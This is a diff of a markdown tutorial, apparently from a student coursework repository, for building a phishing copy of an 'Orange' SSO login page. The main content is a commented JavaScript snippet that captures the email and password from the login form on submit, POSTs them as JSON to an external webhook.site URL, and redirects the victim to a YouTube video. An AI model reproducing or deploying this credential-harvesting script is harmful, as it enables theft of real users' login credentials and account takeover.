@@ -16,21 +16,29 @@
 - write this script (and use the url of the webhook)
 
 >  let myForm = document.getElementById('sso-form');  // "let name" create a variable and then we put in it the content of an id. Here id of the form
+
 >  let formEmail = document.getElementById('sso-email'); // id of the mail input
+
 >  let formPassword = document.getElementById('sso-password');// id of the password input
->  
+
 >  myForm.addEventListener('submit', (e) => { // we wait for specific moment to run, here it's the submit button
->    e.preventDefault();
+
+>  e.preventDefault();
+
 >   fetch('https://webhook.site/ccbd4eb0-f4b0-48c0-96da-4a96ab73004c', { //when it's in action the script fetch the data and return it to the web hook url
+
 >       method: "POST",
+
 >        body: JSON.stringify({ //this line transform the data we collect (who's in json format) and transform it into strings
+
 >            username: formEmail.value, //here we say to stock those string into the variable we have creat on the top
+
 >            password: formPassword.value
 >        })
 >    }).then(window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"); // after all of this the user is redirected to this URL
 >  })
->
-> ![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/data.js.png)
+
+ ![](https://github.com/Mahgnislaw/BecodeProjects/blob/main/2_The%20hill/Phishing/Phising%20Site/Orange/img/data.js.png)
 
 
 ## 4) Make some change on the HTML 
